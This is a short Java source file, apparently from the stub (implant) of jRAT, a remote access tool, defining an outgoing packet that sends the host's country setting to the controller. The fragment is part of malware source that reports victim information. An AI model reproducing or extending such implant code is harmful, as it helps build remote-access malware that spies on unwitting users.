package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet8InitCountry extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(System.getProperty("user.country"));
	}

	@Override
	public byte getPacketId() {
		return (byte) 8;
	}
}